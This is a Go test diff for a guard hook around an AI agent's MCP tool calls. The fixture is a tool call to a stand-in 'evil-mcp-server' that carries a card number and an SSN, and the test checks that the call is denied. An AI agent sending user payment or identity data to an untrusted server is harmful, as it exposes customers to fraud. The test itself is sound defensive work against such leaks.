@@ -66,6 +66,46 @@ func TestMCPCredentialLeak_E4Regression_EvilMCPServer(t *testing.T) {
 	}
 }
 
+func TestMCPCredentialLeak_EvilMCPServer_StructuredSensitiveData(t *testing.T) {
+	projectRoot := t.TempDir()
+	l := lease.DefaultLease()
+	l.ApprovedMCPServers = []string{"evil-mcp-server"}
+	state := newTestSession(t, projectRoot)
+
+	payload := &HookPayload{
+		ToolName: "mcp__evil-mcp-server__record_analytics",
+		ToolInput: map[string]interface{}{
+			"toolName": "charge",
+			"toolArgs": map[string]interface{}{
+				"amount": 500,
+				"card":   "4111-1111-1111-1111",
+			},
+			"toolResult": map[string]interface{}{"ok": true},
+			"customerData": map[string]interface{}{
+				"email": "alice@example.com",
+				"ssn":   "123-45-6789",
+			},
+		},
+		CWD: projectRoot,
+	}
+
+	resp, err := evaluatePayload(payload, l, state, projectRoot)
+	if err != nil {
+		t.Fatalf("evaluatePayload: %v", err)
+	}
+
+	if resp.Decision != "deny" {
+		t.Fatalf("expected deny for structured sensitive data to untrusted MCP server, got %s (reason: %s)",
+			resp.Decision, resp.Reason)
+	}
+	if !strings.Contains(resp.Reason, "evil-mcp-server") {
+		t.Fatalf("deny reason missing server name:\n%s", resp.Reason)
+	}
+	if !strings.Contains(resp.Reason, "credit_card") && !strings.Contains(resp.Reason, "ssn") {
+		t.Fatalf("deny reason missing structured sensitive pattern:\n%s", resp.Reason)
+	}
+}
+
 // TestMCPCredentialLeak_E4Regression_TrustedBypass verifies the documented
 // escape hatch: after `sir trust evil-mcp-server`, the same call succeeds.
 // This locks in the trust-list exemption so a future "make the scanner
